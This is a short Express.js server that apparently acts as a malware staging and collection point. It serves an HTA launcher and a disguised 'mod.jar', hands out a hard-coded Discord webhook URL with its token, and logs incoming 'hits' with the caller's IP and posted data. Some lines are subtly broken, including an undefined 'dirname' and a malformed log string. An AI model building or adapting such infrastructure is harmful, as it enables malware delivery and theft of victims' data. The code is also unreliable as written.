const express = require("express");
const path = require("path");
const fs = require("fs");

const app = express();

app.set("trust proxy", 1);
app.use(express.json({ limit: "2mb" }));

// Serve HTA
app.get("/", (req, res) => {
  res.type("text/html");
  res.sendFile(path.join(dirname, "file.hta"));
});

// Serve JAR
app.get("/mod.jar", (req, res) => {
  res.sendFile(path.join(dirname, "mod.jar"));
});

// Serve Webhook
app.get("/wh", (req, res) => {
  res.type("text/plain").send("https://discord.com/api/webhooks/1569041795680051402/xH9qiVOoEAb72GdGoozUiSfXBYLR-WdqIONNXez_evn_C_DWuQ9J5Ra7CvFAJbXVLhIE");
});

// Log hits
app.post("/log", (req, res) => {
  fs.appendFileSync(path.join(__dirname, "hits.log"), JSON.stringify({ time: new Date(), ip: req.ip, data: req.body }) + "\n");
  res.sendStatus(204);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, "0.0.0.0", () => {
  console.log(Server running on ${PORT});
});
